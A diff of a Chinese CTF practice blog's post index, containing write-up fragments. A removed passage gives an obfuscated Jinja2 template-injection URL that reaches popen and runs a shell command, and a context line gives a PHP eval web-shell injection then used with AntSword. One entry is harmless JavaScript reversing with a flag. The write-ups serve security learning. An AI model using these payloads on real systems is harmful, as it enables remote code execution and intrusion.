-<p>通过此我们便可以得到object类</p>
-<h3 id="获得可以利用的类"><a href="#获得可以利用的类" class="headerlink" title="获得可以利用的类"></a>获得可以利用的类</h3><p>通过<code>object.__subclasses__()</code>我们可以看到</p>
-<p><img src="https://live.staticflickr.com/65535/48236975411_c991a2a21d_o.png" alt></p>
-<p>这其中都是我们可以利用的类。</p>
-<p>搜索上述关键字，我们可以找到popen</p>
-<p>通过构造</p>
-<p><code>http://127.0.0.1:19008/%7B%7B&#39;&#39;[&quot;__c&quot;+&quot;lass__&quot;][&quot;__m&quot;+&quot;ro__&quot;][1][&quot;__subcl&quot;+&quot;asses__&quot;]()[20].__init__.__globals__[&quot;pop&quot;+&quot;en&quot;](&quot;ls%20/&quot;).read()%7D%7D</code></p>
-<p>我们可以得到</p>
-<p><img src="https://live.staticflickr.com/65535/48236974536_32c6b6c872_o.png" alt></p>
-]]></content>
-      <tags>
-        <tag>Writeup</tag>
-        <tag>Note</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>个人练习WP Week 5 B</title>
     <url>/2019/07/08/Week5-B/</url>
     <content><![CDATA[<h1 id="NU1L-2018-CTF"><a href="#NU1L-2018-CTF" class="headerlink" title="NU1L 2018 CTF"></a>NU1L 2018 CTF</h1><p>一个令我绝望的题 官方 writeup 23页</p>
@@ -1517,28 +1517,6 @@
       </tags>
   </entry>
   <entry>
-    <title>个人练习WP Week 7 B</title>
-    <url>/2019/07/08/Week7-B/</url>
-    <content><![CDATA[<h1 id="Week-7-B-Training-Get-Resourced"><a href="#Week-7-B-Training-Get-Resourced" class="headerlink" title="Week 7 B Training-Get-Resourced"></a>Week 7 B Training-Get-Resourced</h1><p>下载代码</p>
-<p><img src="https://live.staticflickr.com/65535/48238109376_961ef10793_o.png" alt></p>
-<p>字节码,拿浏览器打开，解析一波</p>
-<p><img src="https://live.staticflickr.com/65535/48238110011_422fcce87a_o.png" alt="屏幕快照 2018-12-22 下午2.02.53"></p>
-<p>在代码上加入<code>console.log(_);</code></p>
-<p>我们在console有<img src="https://live.staticflickr.com/65535/48238110641_769be3299f_o.png" alt></p>
-<p><img src="https://live.staticflickr.com/65535/48238111086_5f911d8f60_o.png" alt></p>
-<p><img src="https://live.staticflickr.com/65535/48238199692_8c99fbd1d8_o.png" alt></p>
-<p>我们直接改if</p>
-<p><img src="https://live.staticflickr.com/65535/48238200457_74008a38a3_o.png" alt></p>
-<p>点击加个<code>;</code></p>
-<p><img src="https://live.staticflickr.com/65535/48238112786_2e8a559b80_o.png" alt></p>
-<p>Flag <code>flag{it&#39;s_a_h0le_in_0ne}</code></p>
-]]></content>
-      <tags>
-        <tag>Writeup</tag>
-        <tag>Note</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>个人练习WP Week 7 A</title>
     <url>/2019/07/08/Week7-A/</url>
     <content><![CDATA[<h1 id="WEEK-7-A-mfw"><a href="#WEEK-7-A-mfw" class="headerlink" title="WEEK 7 A - mfw"></a>WEEK 7 A - mfw</h1><h3 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h3><p>给大家推荐一下xctf的攻防世界，那个邀请码可以上公众号上要</p>
@@ -1560,6 +1538,28 @@
 <p><code>page=about%27,%27r%27)===eval($_POST[&#39;shell&#39;]);//</code></p>
 <p>拿antsword连接</p>
 <p><img src="https://live.staticflickr.com/65535/48231893571_9da82e0589_o.png" alt></p>
+]]></content>
+      <tags>
+        <tag>Writeup</tag>
+        <tag>Note</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>个人练习WP Week 7 B</title>
+    <url>/2019/07/08/Week7-B/</url>
+    <content><![CDATA[<h1 id="Week-7-B-Training-Get-Resourced"><a href="#Week-7-B-Training-Get-Resourced" class="headerlink" title="Week 7 B Training-Get-Resourced"></a>Week 7 B Training-Get-Resourced</h1><p>下载代码</p>
+<p><img src="https://live.staticflickr.com/65535/48238109376_961ef10793_o.png" alt></p>
+<p>字节码,拿浏览器打开，解析一波</p>
+<p><img src="https://live.staticflickr.com/65535/48238110011_422fcce87a_o.png" alt="屏幕快照 2018-12-22 下午2.02.53"></p>
+<p>在代码上加入<code>console.log(_);</code></p>
+<p>我们在console有<img src="https://live.staticflickr.com/65535/48238110641_769be3299f_o.png" alt></p>
+<p><img src="https://live.staticflickr.com/65535/48238111086_5f911d8f60_o.png" alt></p>
+<p><img src="https://live.staticflickr.com/65535/48238199692_8c99fbd1d8_o.png" alt></p>
+<p>我们直接改if</p>
+<p><img src="https://live.staticflickr.com/65535/48238200457_74008a38a3_o.png" alt></p>
+<p>点击加个<code>;</code></p>
+<p><img src="https://live.staticflickr.com/65535/48238112786_2e8a559b80_o.png" alt></p>
+<p>Flag <code>flag{it&#39;s_a_h0le_in_0ne}</code></p>
 ]]></content>
       <tags>
         <tag>Writeup</tag>
